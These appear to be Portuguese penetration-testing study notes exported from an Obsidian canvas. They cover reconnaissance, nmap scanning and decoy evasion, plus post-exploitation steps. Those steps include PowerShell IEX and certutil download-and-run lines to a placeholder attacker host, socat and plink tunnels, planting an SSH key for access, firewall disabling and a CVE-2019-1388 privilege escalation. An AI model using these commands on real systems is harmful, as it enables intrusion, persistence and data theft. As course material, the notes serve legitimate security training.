		{"id":"ebfe00158a00eae1","type":"text","text":"## Google Dork GHDB Script\n\ngoogle dork\n```google\nsite:.com.br filetype:sql mysqldump\n```\n\nexploit-db.com/google-hacking-database\n![[Screenshot_151.png]]\n\n```bash\n#!/bin/bash\nSEARCH=\"firefox\"\nALVO=\"$1\"\necho \"Pesquisa no pastebin\"\n$SEARCH 'https://google.com/search?q=site:pastebin.com+$ALVO' 2> /dev/null\n\necho \"Pesquisa no Trello\"\n$SEARCH 'https://google.com/search?q=site:trello.com+$ALVO' 2> /dev/null\necho \"Pesquisa por arquivos\"\n$SEARCH 'https://google.com/search?q=site:$ALVO+ext:php+OR+ext:asp+OR+ext:txt' 2> /dev/null\n```\n","x":1178,"y":-5960,"width":1049,"height":620,"color":"4"},
		{"id":"b55f7d815fc99243","type":"text","text":"## Bing Hacking\n\nDa mesma coisa que o google faz podemos fazer aqui, so que o  diferencial e que podemos usar o ip e tambem e mais um banco de dados\n```bing\nip:\"192.162.8.0\"\n```","x":2352,"y":-5817,"width":725,"height":335,"color":"4"},
		{"id":"c3bbba0695e98ec5","type":"text","text":"## Analisando Metadados\n\n```kali\napt install exiftool\n```\n\n```kali\nexiftool arquivo.pdf\n```\n![[Screenshot_155.png]]\n","x":1282,"y":-6777,"width":840,"height":554,"color":"4"},
		{"id":"575cdd808a7dafde","type":"text","text":"## TheHarvester\n```kali\napt install theharvester\ntheharvester\n```\n\nComo executar\n```kali\ntheHarvester -d site.com -l 100 -b google -f resultado.html\n```\n\npodemos adicionar apis no theharvester\n```kali\ncd /etc/theHarvester\nnano api.keys.yaml\n```\n![[Screenshot_153.png]]\n","x":2315,"y":-6880,"width":799,"height":760,"color":"4"},
		{"id":"cc81beb8a8c30886","type":"text","text":"## IANA\n\niana = internet assigned numbers authority\n![[Screenshot_156.png]]\n\n![[Screenshot_157.png]]\n\n![[Screenshot_158.png]]\n![[Screenshot_159.png]]\n![[Screenshot_160.png]]\n![[Screenshot_161.png]]\n","x":2551,"y":-80,"width":831,"height":960,"color":"4"},
		{"id":"726597a25256fac0","type":"text","text":"## Coletando informações com o Whois\n\nwhois da iana\n![[Screenshot_162.png]]\n\nwhois do registro br\n![[Screenshot_163.png]]\n\nLinha de comando\n```bash\n#linux\nwhois businesscorp.com.br\n#casso queira forcar a resposta pela iana\nwhois -h whois.iana.org businesscorp.com.br\n```\n\n\n## Como o Whois Funciona\n\nVamos entender como o whois funciona\n\n```bash\n#abra o wireshark\nwireshark\n#adicione o filtro\ntcp or udp port 53\n#fassa um whois em qualquer site\nwhois businesscorp.com.br\n```\n\n![[Pasted image 20230505092636.png]]\n\nAgora vamos validar o ipv6 com host\n\n```bash\nhost whois.registro.br\n```\n\nAgora com o endereço ipv4 vamos usar o ncat para obter comunicação com o ipv6\n\n```bash\napt install ncat\nnc -v -6 2001:12ff:0:2::3 43\nbusinesscorp.com.br\n```\n","x":1066,"y":2,"width":1278,"height":797,"color":"4"},
		{"id":"5d5e89752e802eec","type":"text","text":"## RDAP\n\nO RDAP (Registration Data Access Protocol) e o protocolo que vai substituir o whois pelo fato que o whois tem vários problemas sites do RDAP abaixo.\n\nclient.rdap.org\nrdap-web.lacnic.net\nregistro.br/rdap/\n![[Screenshot_164.png]]\n![[Screenshot_165.png]]\n\nclient.rdap.org\n![[Screenshot_166.png]]\n","x":1169,"y":1040,"width":1072,"height":868,"color":"4"},
		{"id":"6ce922a41d3ebb75","type":"text","text":"## Mapeando a Infra - Pesquisa por IP\n\nVamos descobrir o ip primeiramente\n```kali\nhost site.com\n```\n\nvamos na arin e colocar o endereco ip \nhttps://search.arin.net/rdap/\n![[Screenshot_167.png]]\n\npodemos tambem fazer pelo terminal (asn e inet)\n```kali\nwhois IP\nwhois IP | grep \"inetnum\" | egrap \"inetnum|aut-num\"\n```\n![[Screenshot_168.png]]\n\n","x":2532,"y":1040,"width":869,"height":868,"color":"4"},
		{"id":"987d9869b9f21a49","type":"text","text":"## Mapeando a Infra - BGP\n\nPodemos usar 2 sites\n\nbgpview.io\n![[Screenshot_169.png]]\n\nbgp.he.net\n![[Screenshot_170.png]]\n\nColocamos o endereco ip no site e ele ira trazer o asn\n![[Screenshot_171.png]]\n![[Screenshot_172.png]]\n","x":2532,"y":2120,"width":869,"height":840,"color":"4"},
		{"id":"4a7e75652be8e60c","type":"text","text":"## Pesquisa no Shodan\n\nshodan.io\n![[Screenshot_173.png]]\n![[Screenshot_174.png]]\n\n","x":1169,"y":2120,"width":1072,"height":840,"color":"4"},
		{"id":"7d25db650b858cd3","type":"text","text":"## Pós Exploração","x":12309,"y":-360,"width":312,"height":80,"color":"6"},
		{"id":"50c98c7323b1299c","type":"text","text":"## Utilizando a API do Shodan\n\n![[Screenshot_175.png]]\nvamos instalar o shodan\n```bash\npip install shodan\n\nshodan init SuaAPI\nshodan count country:br port:445 contabilidade \nshodan search —fields ip_str,org,port,hostnames country:br port:445 contabilidade  shodan host 168.192.1.0 \nshodan domain site.com.br\n```\n![[Screenshot_176.png]]\n\npodemos baixar os arquivos caso sejamos membro do shodan\n```kali\nshodan download tanque port:10001 tanque country:br\nshodan parse --fields ip_str,port,org,hostnames --separator , tanque.jason.gz\n```","x":1169,"y":3240,"width":1072,"height":1089,"color":"4"},
		{"id":"35ed78a7899bbe0a","type":"text","text":"## Pesquisa no Censys\n\ncensys.io\n![[Screenshot_177.png]]\n\n```censys\nlocation.country_code:BR\nlocation.city:salvador\nlocation.country_code:BR AND metadata.os:windows\n123.123.12.123\n123.123.12.123/24\nip{123.123.12.123 TO 123.123.12.123}\nlocation.country_code:BR AND metadata.os:Ubuntu AND 80.http.get.title:\"index of\"\n```","x":2532,"y":3369,"width":869,"height":832,"color":"4"},
		{"id":"932d1572de41c31a","type":"text","text":"## Pesquisa Domain Name System\n\n![[Screenshot_178.png]]\n\n```kali\nhost -t SOA businesscorp.com.br\nhost -t A businesscorp.com.br\nhost -t AAAA businesscorp.com.br\nhost -t NS businesscorp.com.br\nhost -t CNAME businesscorp.com.br\nhost -t MX businesscorp.com.br\nhost -t PTR businesscorp.com.br\nhost -t HINFO businesscorp.com.br\nhost -t TXT businesscorp.com.br\n```\n","x":2532,"y":4560,"width":869,"height":720,"color":"4"},
		{"id":"b2272ea06868c0fb","type":"text","text":"## Script para Zone Transfer\n\nforcando uma ZT\n```kali\nhost -l businesscorp.com.br\nhost -l businesscorp.com.br ns1.businesscorp.com.br\n```\n![[Screenshot_179.png]]\n```kali\nhost -l businesscorp.com.br ns2.businesscorp.com.br\n```\n![[Screenshot_180.png]]\n\n```bash\n#!/bin/bash\nfor server in $(host -t ns $1 | cut -d \" \" -f4);\ndo\nhost -l -a $1 $server\ndone\n```\n","x":1290,"y":4560,"width":831,"height":720,"color":"4"},
		{"id":"62c79abd6232738a","type":"text","text":"## Script para Pesquisa Direta (DNS)\n\n```bash\n#criando uma lista de Bruteforce domain\nnano lista.txt\n--\nfirewall\nmonitoramento\nintranet\nns1\nns01\nmail\nwebmail\nrh\nsistema\nhomologacao\nadmin\nlogs\ndevs\ndocumentos\nserver\napi\n```\n\n```bash\n#!/bin/bash\necho \"Modo de uso ./script businesscorp.com.br\"\nfor palavra in $(cat lista.txt);\ndo\nhost $palavra.$1 | grep -v \"NXDOMAIN\"\ndone\n```\n","x":1263,"y":5480,"width":886,"height":560,"color":"4"},
		{"id":"2e8ce15e752fba87","type":"text","text":"## Script para Pesquisa Reversa (DNS)\n```bash\necho \"passar o ip 3-digitos e o range\"\nfor ip in $(seq $2 $3);\ndo\nhost -t ptr $1.$ip | grep -v \"$1\" | cut -d \" \" -f 5\ndone\n```\n","x":2636,"y":5619,"width":661,"height":283,"color":"4"},
		{"id":"f47324762fc5489c","type":"text","text":"## Analisando SPF\n\no SPF basicamente e identificar quais servidores estão autorizados a enviar um email em nome do seu domínio\n![[Screenshot_181.png]]\n\nVamos veirificar se e permitido\n```kali\nhost -t txt businesscorp.com.br\n```\n![[Screenshot_182.png]]\n\nVamos validar isso\ncaso o email chegue ate o rodrigo com o @ da busines, entao esta vulneravel\nhttps://emkei.cz/\n![[Screenshot_183.png]]\n![[Screenshot_184.png]]","x":3680,"y":5270,"width":960,"height":981,"color":"4"},
		{"id":"e3a9cead6cfd45d5","type":"text","text":"## Descobrindo hosts ativos Pentest Interno\n\naqui nos vamos trabalhar com o protocolo arp\nnosso firewall do servidor esta bloqueando icmp\n\nvamos usar o protocolo arp\n```kali\narping -c 1 192.168.0.1\nfor ip in $seq(1 14);do arping -c 1 192.169.0.$ip;done | grep \"60 bytes\"\n```\n\npodemos usar tambem\n```kali\narp-scan -l\n```\n\n","x":7071,"y":1156,"width":670,"height":480,"color":"3"},
		{"id":"7a75c7c10a251e45","type":"text","text":"## TCP Host Scan\n\nobjetivo e identificar todas as portas abertas no host, vai passar por todas as 65535 portas\n```kali\nnmap -v -sS -p- -Pn 192.168.0.1\n```","x":7071,"y":1836,"width":505,"height":420,"color":"3"},
		{"id":"cae38e0ab2c4d6b6","type":"text","text":"## UDP Host Scan\n![[Screenshot_222.png]]\n\n```kali\nnmap -v -sU -p 161 172.16.1.4\n```\n\n```kali\nnmap -v -sUV -p 161,162,53,5060 172.16.1.4\n```","x":7071,"y":2326,"width":505,"height":420,"color":"3"},
		{"id":"04a35c9e8a4b0606","type":"text","text":"## Enganando o Atacante\n\nALVO\n\nvamos enganar o atacante alterando as portas de seus serviços padrões para outros\n\n```bash\nnano /etc/sshd_config\n```\n![[Pasted image 20230203212618.png]]\n```kali\nservice ssh start\nnetstat -nlpt\n```\n\nATACANTE\n\n```bash\nnmap -v -sS -Pn -p 21 172.192.1.0\n```\n\nAgora como podemos ver esta falando que na porta 21 roda o ftp que e padrao da porta 21, mas como foi visto mudamos para que a porta 21 fosse ssh, mas o nmap nao consegue identificar isto a menos que executemos o codigo correto.\n![[Pasted image 20230203212643.png]]\n\nCodigo corredo para executar\n\n```bash\nnmap -v -sV -Pn -p 21 21 172.192.1.0\n```\n\nagora sim e retornado o servico correto\n![[Pasted image 20230203212654.png]]\n\nMas oque acontece quando fazemos isso com a versão ou seja o banner\n\nALVO\n\n```bash\napt install bless\n\nservice ssh stop\nwhereis sshd\ncp /usr/sbin/sshd /root/Desktop/\n```\n\n```bash\nbless sshd\n```\n![[Pasted image 20230203212705.png]]\n\nLogo após isto podemos alterar o nome\n![[Pasted image 20230203212711.png]]\nE agora o nmap e facilmente enganado\n![[Pasted image 20230203212723.png]]\n","x":5072,"y":66,"width":920,"height":980,"color":"5"},
		{"id":"0bbf845f616bbc92","type":"text","text":"## Tracking the route\n\nmanipula quantos ttl seram enviados no caso aqui e 1\n```linux\nping businesscorp.com.br -c 1 -t 1 \n```\n\n```bash\n# mostra todos os roteadores que estao passando\ntraceroute businesscorp.com.br\n\n# aumenta o tempo de resposta em 5 segundos\ntraceroute businesscorp.com.br -w 5\n\n# quantos ttls queremos enviar\ntraceroute businesscorp.com.br -m 10\n\n# a partir de qual salto vamos comecar\ntraceroute businesscorp.com.br -m 20 -f 15\n\n# mostra os AS = autonamo sistem\ntraceroute businesscorp.com.br -A\n```\n\nTestando o tipo de pacote aceito e chegando no alvo\nOque queremos sabe e que se o pacote que enviamos vai chegar ate o alvo\n```bash\n# -I usa o protocolo ICMP, -T usa protocolo TCP, -U usa protocolo UDP\ntraceroute businesscorp.com -n -I\n\n# -p e possivel atingir uma porta desejada\ntraceroute businesscorp.com.br -n -I -p 43\n```\n","x":5163,"y":1226,"width":740,"height":980,"color":"5"},
		{"id":"36a9b439c58ceb03","type":"text","text":"## Bypass IDS_IPS_FW\n\nIDS = Monitora IPS = Age contra o ataque\n\nvamos tentar ser o mas furtivo possível\n```kali\nnmap -v -sS --top-ports=10 --open -Pn 192.168.0.11\n```\n\nModo Decoy (bypass)\n```kali\nnmap -v -D 10.12.2.34,10.12.2.34 -sS --top-ports=25 --open -Pn 192.168.0.11\n```\nPodemos fazer diferente também\n```kali\nnmap -v -D RND:50 -sS --top-ports=25 --open -Pn -T 2 192.168.0.11\n```\n","x":5206,"y":2386,"width":652,"height":582,"color":"5"},
		{"id":"fd026a8114829ae9","type":"text","text":"## Port Scanning\n\n```bash\nhping3 -c 1 --syn -p 80 businesscorp.com.br\n```\n\nPorta aberta\n![[Pasted image 20230203204241.png]]\n\nPorta fechada\n![[Pasted image 20230203204300.png]]\n\n```bash\nnmap -sS -p 80 -Pn businesscorp.com.br\n```\n\nquando esta filtered esta com firewall\n![[Screenshot_214.png]]\n","x":5992,"y":1836,"width":864,"height":910,"color":"3"},
		{"id":"79ef4d7c64beb963","type":"text","text":"## Identificando serviços\nScan identificando o servico\nbasicamente oque ele faz e se conectar ao algo e fazer um banner grabing\n```kali\nnmap -V -sV -Pn 172.16.1.2\n```\n![[Screenshot_226.png]]\n","x":6086,"y":1176,"width":680,"height":440,"color":"2"},
		{"id":"67f85b9ba8ea1a4f","type":"text","text":"## Descobrindo hosts ativos Nmap\n\n```kali\nnmap -sn 37.59.174.224-239\n```\n\n```kali\nnmap -sn 172.16.1.0/24 -oG hostsativos.txt\n```\n\n```kali\ncat hostsativos | cut -d \" \" -f 2 > ips\n```\n\nTemos uma pasta para scripts de nmap\n\n```bash\n/usr/share/nmap/scripts/\n```\n\nMapeamento de Portas\n\n```bash\n#mostra portas abertas e fechadas\nnmap -v -p 21-25,80,8080 -Pn 172.16.1.5\n----------------------------------------------\n#mostra apenas portas abertas\nnmap -v -p 21-25,80,8080 --open -Pn 172.16.1.5\n----------------------------------------------\n#varre as 1000 portas mas comuns\nnmap -v -sS -Pn 172.16.1.5\n----------------------------------------------\n#varre as 5 principais portas\nnmap -v -sS --top-port=5 -Pn 172.16.1.5\n----------------------------------------------\n#varre a rede inteira\nnmap -v -sS -Pn 172.16.1.5/24\n----------------------------------------------\n```","x":6136,"y":66,"width":580,"height":940,"color":"2"},
		{"id":"9f1207f78a20403b","type":"text","text":"## Descobrindo sistema operacional pelo TTL\n\nTTL = Time to live = tempo de vida\n```kali\nping site.com -c 1\n```\n\nValor do ttl em cada sistema por defalt mas pode ser alterado\n```bash\n64 - Linux\n128 - Windowns\n\n# ou seja o ttl do ping e linux\n64 - 48 == distancia de rotas que o alvo pasou\n```","x":7031,"y":296,"width":750,"height":480,"color":"4"},
		{"id":"790a16e732a8393e","type":"text","text":"## Scaning","x":5903,"y":-360,"width":190,"height":80,"color":"6"},
		{"id":"aba11d23423eba1c","type":"text","text":"## Diferenças entre shells\n\nShell interativa \nE a shell padrao que usamos no kali linux que interage direto com voce que esta a usando, ja uma shell nao interativa voce nao consegue fazer estas coisas\n![[Pasted image 20230401185247.png]]\n\nShell nao interativa\nConseguimos executar alguns comandos como ls e id entre outros, mas se tentarmos um passwd ou uma conexao ftp ja nao funciona mas, voce nao consegue enviar dados ao servidor\n![[brave_5VY50QfcNg.png]]\n\nConseguimos melhorar a shell nao interativa caso o servidor tenha o python instalado e o servidor seja linux\n```\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\n\nstty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;\n```\n![[Pasted image 20230401185323.png]]","x":11868,"y":-100,"width":1195,"height":911,"color":"4"},
		{"id":"b718298fb16f669a","type":"text","text":"## Transferências de arquivos Web\n\nMaquina do pentester - Abrimos o servidor e depois do servidor aberto podemos fazer o download, como mostra abaixo da imagem, lembrando que ja tem que estar com uma shell no servidor do alvo.\n![[Pasted image 20230401185603.png]]\n\n```kali\nservice apache2 start (/var/www/html/file.exe)\n```\n\n```kali\npython -m SimpleHTTPServer 80\n```\n\n```kali\npython3 -m http.server 80\n```\n\nNa maquina alvo\n![[Pasted image 20230401185615.png]]\n\nWindows\n```\ncertutil.exe -urlcache -f http://HOSTATACANTE/file.exe file.exe\n```\n\n```\npowershell.exe wget http://HOSTATACANTE/file.exe -OutFile file.exe\n```\n\n```\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http://HOSTATACANTE/file.exe','file.exe')\n```\n\n```\npowershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://HOSTATACANTE/poc.exe')\n```\n\nLinux\n```\nwget http://HOSTATACANTE/file.exe -O /tmp/file.exe\n```\n\n```\ncurl http://HOSTATACANTE/file.exe -o file.exe\n```\n","x":11867,"y":1018,"width":1195,"height":911,"color":"4"},
		{"id":"57e9f8bc20c49758","type":"text","text":"## Transferências de arquivos FTP\n![[brave_an3JJKviH5.png]]\n\n![[brave_KMKmVAGTvH.png]]\n\nem alguns cassos nos vamos cair com uma shell nao interativa,nestes cassos oque podemos fazer e criar um arquivo que mande os comandos de autenticacao para o servidor ftp e depois chamamos ele.\n\nDiretorio de downloads\n![[brave_8r3LTJ8Hne.png]]\n\nbaixando com shell nao interativa\n![[brave_Wr4d2kLacI.png]]","x":11862,"y":2147,"width":1195,"height":911,"color":"4"},
		{"id":"5a858338a818f77a","type":"text","text":"## Transferências de arquivos HEX\n\nEsta tecnica encoda o binario de um executavel em um formato de texto.\n\nVamos usar a ferramenta que faz isso\nVamos usar tambem o plink.exe como exemplo\n![[brave_4XNpryIlLQ.png]]\n\nMas antes de fazer isso temos que reduzir o tamanho do arquivo usando uma outra ferramenta\n```kali\nupx -9 plink.exe\n```\n![[brave_OE5JCprmBe.png]]\n\nAgora podemos transformar o nosso arquivo em HEX\n```kali\nexe2hex -x plink.exe -p plink.txt\n```\n![[brave_Zr9jTuhdvM.png]]\n\nVamos abrir o arquivo com o mousepad e copiar tudo que esta dentro dele\n```kali\nmousepad plink.txt\n```\n![[brave_8JZRerQjWX.png]]\n\nOque vamos fazer agora e colar no terminal do alvo, no caso na shell reversa do windows que nos temos, ao fazer isso nosso arquivo plink vai ser enviao ao servidor\n![[brave_inFlBc3its.png]]\n\n![[brave_3uGXQegBTS.png]]\n","x":11834,"y":3227,"width":1252,"height":911,"color":"4"},
		{"id":"b2cdcdfa8f360023","type":"text","text":"## Tunelamento SSH\n\nNas anotacoes passadas nos conseguimos acesso ao ssh\n![[brave_bld86TjTUA.png]]\n\nMas ainda no comando para se conectar ao ssh nos poderiamos direcionar um trafego local deste alvo para nossa maquina local\n\nNo servidor alvo por exemplo temos a porta 3306 aberta que funciona apenas localmente\n![[brave_xmhNbBSlgf.png]]\n\nEntao queremoos direcionar o trafego desta porta 3306 utilizando o ssh, vamoos fazer isso na nossa maquina kali.\nOque nos estamos fazendo e pegando o servico la do servidor e redirecionando ele para a porta 3333 que e local da nossa maquina\n```kali\nssh www-data@127.0.0.1 -p 2222 -i desec -L 3333:127.0.0.1:3306\n```\n![[brave_IjQThI4LD2.png]]\n\nApos isso a conexao do tunelamente vai ser fechada, basta abrirmos novamente como ja  vimos nas aulas passadas, logo depois de ter aberto novamente o tunelamento executamos o comando novamente.\n```kali\nssh www-data@127.0.0.1 -p 2222 -i desec -L 3333:127.0.0.1:3306\n```\n![[brave_Mm78CNHtTv.png]]\n\nQuando fazemos isso em outro terminal vemos que consguimos abrir uma porta 3333\n![[brave_IWLo4dcss2.png]]\n\nBom a porta que abrimos ela e do mysql entao vamos nos conectar a ele\n```kali\nmysql -h 127.0.0.1 -P 3333 -u root -p\n```\n![[brave_5lHNnIimmH.png]]\n","x":13333,"y":1019,"width":987,"height":911,"color":"4"},
		{"id":"2f22a1dd96fd21db","type":"text","text":"## Tunelamento Linux com SOCAT \n\nVamos usar um host com a falha de lfi\n![[brave_JL8o7M4awe.png]]\n\nCom uma shell reversa que conceguimos fazer explorando o host vamos para o terminal\n\nBom conseguindo uma shell no servidor pela conexao do nc, podemos ver outros hosts conectador localmente na maquina alvo\n```kali\nnetstat -nlpt\n```\n\nVemos que tem 2 portas abertas uma que e a 22 (ssh) e a outra 3306 (mysql), ambas estao rodando localmente\n![[brave_uimg2KseUI.png]]\n\nO tunelamento e basicamente agente pegar um destes servicos que queremos acessar e enviar o trafego dele para alguma porta na nossa maquina, isto e usado para que conseguimos acessar servicos que estao funcionando apenas na maquina local e nao estao expostos diretamente.\n![[brave_nGbB4B94uK.png]]\n![[brave_9Yp8RXFaYr.png]]\n\n\nVamos fazer isso na pratica.\n\nPrimeiramente precisamos ver se o servidor alvo tem o socat instalado, vamos verificar isso com um comando.\n```alvo\nwhereis socat\n```\n![[brave_v4Zf032tQ3.png]]\n\numa outra forma de fazer isso e mandar o comando ``dpkg -l | grep \"socat\"`` na url do alvo.\n![[brave_R4ycftWIGB.png]]\n\nConfirmando isso na nossa maquina kali podemos configurar o nosso socat\n```kali\nsocat TCP-LISTEN:8443,reuseaddr,fork TCP-LISTEN:2222,reuseaddr\n```\n\nPara confimar que foi aberta podemos olhar com um comando\n```kali\nnetstat -nlpt\n```\n![[brave_5tSbRF1xn8.png]]\n\nVamos ao nosso alvo para iniciar o redirecionamento de servico\n![[brave_VMtRjkd0J4.png]]\n```alvo\nsocat TCP4:172.20.1.6:8443 TCP4:127.0.0.1:22\n```\n\nFeito isso voltando no nosso terminal do kali vemos que uma porta nova foi aberta\n```kali\nnetstat -nlpt\n```\n![[brave_LcGdchuHdn.png]]\n\nAgora nos conseguimos dar o nmap naquele servico ssh que nos nao conseguiamos fazer, com isso podemos explorar o host\n```kali\nnmap -v -sV -p2222 -Pn 127.0.0.1 \n```\n![[brave_0J24BVSGbq.png]]\n","x":13333,"y":3227,"width":987,"height":911,"color":"4"},
		{"id":"dc30bb7a0f4cbb28","type":"text","text":"## Escalando acesso SSH sem senha\n\nQuando fizemos o tunelamento achamos um ssh e nao temos a senha dele, mas isso nao e ploblema pois vamos escalar o acesso sem a senha e usuario do ssh.\n\noque nos podemos fazer e usar um par de chaves publicas e privadas\n\nVamos criar este par de chaves e cadastrar elas no servidor\n\nVamos criar estas chaves\n```kali\nssh-keygen -f desec\n```\n![[brave_mhUNDfnr3H.png]]\n![[brave_14ps6P8CdR.png]]\n\nCom as 2 chaves em mao vamos enviar a chave publica e cadastrala no servidor ssh do alvo\n\nDamos um cat na chave e copiamos ela\n```kali\ncat desec.pub\n```\n![[brave_gs9UpiPriB.png]]\n\nVamos enviar esta chave no servidor, para fazer isso nos ja temos acesso a maqui do alvo mas ainda nao temos ao ssh, vamos criar uma estrutura para nosso usuario www-data.\n\nse formos no diretorio /home/ vamos ver que so temos o usuario user\n![[brave_GUtRWMZr7Z.png]]\n\nVamos construir esta estrutura no servidor alvo\n```\nmkdir ~www-data\nmkdir ~/.ssh/\ntouch ~/.ssh/authorized_keys\n```\n\nAgora oque vamos fazer e dar um echo para criar a nossa chave publica, no final nos direcionamos ela para o arquivo ~/.ssh/authorized_keys\n```\necho \"ssh-rsa AAAAAAASDqDQWDQIWDCJQINCWQOWC\" > ~/.ssh/authorized_keys\n```\n![[Pasted image 20230402125343.png]]\n\nQuando isso acontece nossa conexao com o servidor cai, vamos reiniciar o tunelamento\n\nVamos criar o nosso socat no kali\n```kali\nsocat TCP-LISTEN:8443,reuseaddr,fork TCP-LISTEN:2222,reuseaddr\n```\n\nAlvo\n```alvo\nsocat TCP4:172.20.1.6:8443 TCP4:127.0.0.1:22\n```\n![[brave_6wFDzttZaX.png]]\n\nFeito a reconexao podemos conectar ao ssh usando a nossa chave privada\nNo nosso kali vamos fazer a conexao com o usuario ww-data e passar o arquivo da chave privada\n```kali\nssh www-data@127.0.0.1 -p 2222 -i desec\n```\n\nFeito isso nos conseguimos acesso ao ssh\n![[brave_s911OjySwQ.png]]\n","x":13333,"y":2147,"width":987,"height":911,"color":"4"},
		{"id":"c1f661940fcd0d62","type":"text","text":"## Tunelamento Windows com plink\n\nQuanto obtemos uma shell no windows nao conseguimos acessar os sistemas internos que estao rodando, e exatamente para isto que o tunelamento serve.\n\nVamos subir um ssh na maquina pentester\n```kali\nservice ssh start\n```\n![[brave_Gz9cMEgOXE.png]]\n\nFeito isto vamos para o windows no casso na shell windows, bom vamos usar um programa que se chama plink.exe que no casso voce tera em colocar ele na maquina windowns com a tranferencia de arquivos\n```\nplink.exe -ssh -l desec -pw root -R IPKALI:1337:LOCALHOST:5555 IPKALI\n```\n![[brave_whvr6VDieO.png]]\n\nVoltamos para o kali e executamos o nc e obtemos a shell\n```kali\nnc -v 127.0.0.1 1337\n```\n![[brave_o5RJIrTHFm.png]]\n","x":13333,"y":-100,"width":987,"height":911,"color":"4"},
		{"id":"9f6f960e93953285","type":"text","text":"## PrivEsc","x":14679,"y":-360,"width":312,"height":80,"color":"6"},
		{"id":"e9fcd97d832edd0e","type":"text","text":"## Windows","x":14730,"y":40,"width":210,"height":80,"color":"6"},
		{"id":"a8d9d9fc3d6b615f","type":"text","text":"## Enumeração de Host Windows\n\nInformacaoes do usuario\n```\nwhoami\nwhoami /groups\nnet user\nnet user kair\n```\n![[brave_jHCRf3Rcs6.png]]\n![[brave_RwPTo0K82p.png]]\n![[brave_qnOvebxAmd.png]]\n\nInformacoes do host\n```\nhostname\n```\n![[Pasted image 20230403105204.png]]\n\nInformacoes sobre o sistema\n```\nsysteminfo\n```\n![[brave_StFJCq4Fn8.png]]\n![[brave_dg2ZGA9a3V.png]]\n\nInformacoes sobre processos em execuçao\n```\ntasklist\n```\n![[brave_A4zRplpsHS.png]]\n\nInformacoes sobre adaptadores de rede\n```\nipconfig /all\n```\n![[brave_NwL4esPTcd.png]]\n\nInformacoes sobre hosts que a maquina se comunica internamente\n```\narp -a\n```\n![[brave_QZQ5ywUvJw.png]]\n\nInformacoes da tabela de roteamento\n```\nroute print\n```\n![[brave_wTcSLXHj1v.png]]\n\nInformacoes de portas abertas\n```\nnetstat -ano\n```\n![[brave_zcbEXzlF6Z.png]]\n\nInformacoes de servicos (firewal e windows defender)\n```\nsc query windefend\nnetsh advfirewall show currentprofile\n```\n![[brave_KgsYTJFV9V.png]]\n![[brave_kmSZdDYL67.png]]\n\nDesativar e ativar o firewall\n```\nnetsh advfirewall set currentprofile state on\nnetsh advfirewall set currentprofile state off\n```\n\nBusca por aquivos e strings\n```\nwhere /R c:\\ web.txt\nfindstr /s \"pass=\" *.txt\n```\n\nLe  um arquivo inteiro\n```\ntype arquivo.txt\n```\n","x":15240,"y":-177,"width":760,"height":515,"color":"4"},
		{"id":"1e81ce44fb964b47","type":"text","text":"## Enumeração automatizada no Windows\n\nPara isso vamos usar um programa de automatizacao chamado winPEAS\nhttps://github.com/carlospolop/PEASS-ng/tree/master/winPEAS\n![[Pasted image 20230403105732.png]]\n\nVamos abrir um servidor python para transferir o arquivo para o windowns\n```\npython -m SimpleHTTPServer 80\n```\n![[brave_j8GDh3RESq.png]]\n\nNo alvo vamos usar o powershell para tranferir o arquivo\n```\npowershell -c \"wget http://192.168.0.16/winpeas.bat -Outfile winpeas.bat\"\n```\n![[brave_MAYFyydYvn.png]]\n\nAgora basta nos executa-lo\n```\nwinpeas.bat\n```\n![[brave_5Oc7SBQWgE.png]]\n\nVamos usar um programa que chama wesng, oque ele faz e que ele cruza com a base de dados a versao do seu sistema operacional com base de dados de exploits\nhttps://github.com/bitsadmin/wesng\n\nVamos baixar ele na nossa maquina do pentenster\n```kali\ngit clone https://github.com/bitsadmin/wesng.git\n```\n\nEnquanto ele baixa nos temos que ir no alvo e pegar as informacoes do systeminfo do alvo\n```\nsysteminfo > systeminfo.txt\n```\n![[brave_8W6rUu1dkP.png]]\n\nBom feito isso nos voltamos no nosso kali e vamos dar um update no wesng\n```kali\ncd wesng\npython wes.py --update\n```\n![[brave_JerVksEay0.png]]\n\nOque vamos precisar e pegar o arquivo system infor do servidor alvo, vamos ao servidor alvo e nos vamos copiar todo conteudo do nosso arquivo\n```cmd\ntype systeminfo.txt\n```\n![[brave_4j8GtudpH8.png]]\n\nNa nossa maquina kali nos vamos jogar oque copiamos para um arquivo txt\n```kali\nnano systeminfo.txt\n```\n![[brave_DsGKiKQfnZ.png]]\n\nVamos executar a ferramenta\n```kali\npython wes.py systeminfo.txt\n```\n![[brave_ZWIzFlPl0p.png]]\n![[brave_avYwSdrBG0.png]]\n\n","x":16180,"y":-177,"width":780,"height":515,"color":"1"},
		{"id":"7fdfec9ef41c79e7","type":"text","text":"## Windows PrivEsc Certificate Dialog\n\nVamos usar 2 arquivos que estao no github abaixo\nhttps://github.com/jas502n/CVE-2019-1388\n\nNo caso aqui ja temos o acesso ao servidor alvo e precisamos subir o arquivo para o alvo, quando os arquivos estiverem no alvo podemos continuar, como estao com o RDP basta apenas executar o arquivo priv\n![[Pasted image 20230403121023.png]]\n\nQuando executamos o arquivo aparece um popup \n![[brave_7Ny8Joz1Tt.png]]\n\nClicamos para ver as informacoes de certificado, que e aonde esta a vulnerabilidade\n![[brave_gwINjnzmsJ.png]]\n\nQuando clicamos em inssue by ele abre esta pagina web\n![[Pasted image 20230403121029.png]]\n\nPedimos ele para abrir o cmd.exe e quando abre ele vai abrir como system\n```\nc:\\windows\\system32\\cmd.exe\n```\n![[Pasted image 20230403121034.png]]\n","x":16180,"y":440,"width":791,"height":515,"color":"4"},
